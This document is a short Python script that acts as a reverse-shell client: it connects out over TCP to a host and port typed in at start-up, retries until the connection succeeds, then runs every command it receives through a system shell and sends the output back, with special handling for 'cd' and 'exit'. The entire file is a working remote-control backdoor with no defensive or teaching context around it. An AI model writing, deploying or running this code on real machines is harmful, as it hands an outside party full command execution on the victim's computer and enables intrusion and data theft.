#!/usr/bin/python3

import socket
import subprocess
import os

# Create a socket object
patil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("connecting....")

# Get the server host and port from user input
host = input("Enter the server host (e.g., 127.0.0.1): ")
port = int(input("Enter the server port (e.g., 8888): "))

while True:
    try:
        patil.connect((host, port))  # it connects to the given IP
        break
    except ConnectionRefusedError:
        pass
print("connected")

current_dir = os.getcwd()

while True:
    # Receive command from server
    receive = patil.recv(1024*1024*1024).decode()
    # Check for exit command
    if receive == "exit":
        break
    # Handle cd command to change directory
    if receive.startswith("cd "):
        try:
            new_dir = receive[3:].strip()
            os.chdir(new_dir)
            current_dir = os.getcwd()
            output = f"Changed directory to {current_dir}"
        except Exception as e:
            output = str(e)
    else:
        # Execute command and capture output
        try:
            output = subprocess.check_output(receive, shell=True, stderr=subprocess.STDOUT, cwd=current_dir).decode()
        except subprocess.CalledProcessError as e:
            output = e.output.decode()
    # Send output back to server
    patil.send(output.encode())

# Close the connection
patil.close()
